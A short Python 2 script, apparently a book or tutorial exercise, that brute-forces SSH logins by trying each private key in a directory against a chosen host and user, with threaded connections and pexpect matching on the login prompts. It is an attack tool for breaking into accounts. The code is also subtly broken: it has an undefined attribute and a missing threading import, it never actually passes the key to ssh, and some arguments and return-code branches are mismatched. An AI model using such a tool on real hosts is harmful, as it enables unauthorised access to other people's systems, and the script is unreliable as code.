#!/usr/bin/python
# -*- coding: utf-8 -*-
import pexpect 
import optparse
import os
from threading import Thread, BoundedSemaphore

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(host,user,keyfile,release):
	global Stop
	global Fails

	try:
		permDenied = 'Permission Denied'
		ssh_newkey = 'Are you sure you want to proceed'
		connClosed = 'Connection closed by the remote host'
		opt = '-o PasswordAuthentication=no'
		connStr = 'ssh ' + user + '@' + host
		child = pexpect.spawn(connStr)
		ret = child.expect([pexpect.TIMEOUT, permDenied,ssh.connClosed,'$','#'])
		if ret == 2:
			print '[-] Adding Host to ~/.ssh/known_hosts'
			child.sendline('yes')
			connect(user,host,keyfile,False)
		elif ret == 3:
			print '[-[ Connection closed by remote host'
			Fails += 1
		elif ret > 3:
			print '[*]Success' + str(keyfile)
			Stop = True


	finally:
		if release:
			connection_lock.release()

def main():
	parser = optparse.OptionParser('usage%prog' + '-H <target host>-u<user>-d<directory>')
	parser.add_option('-H', dest='tgtHost', type='string',help='specify the target host')
	parser.add_option('-u', dest='user', type='string',help='specify the user')
	parser.add_option('-d', dest='passDir', type='string', help='specify the directory with the keys')

	(options, args) = parser.parse_args()
	host = options.tgtHost
	user = options.user
	passDir = options.passDir

	if host == None or user == None or passDir == None:
		print parser.usage
		exit(0)

	for filename in os.listdir(passDir):
		if Stop:
			print '[*] Key Found: Exiting'
			exit(0)
		if Fails > 5:
			print '[-] Exiting too many connections closed remotely..Try increasing the number of threads'
			exit(0)

		connection_lock.acquire()
		fullPath = os.path.join(passDir,filename)
		print '[-]Testing the keyfile' + str(fullPath)
		t = threading.Thread(target=connect, args=(user,host,fullPath,True))
		child = t.start()

if __name__ == '__main__':
	main()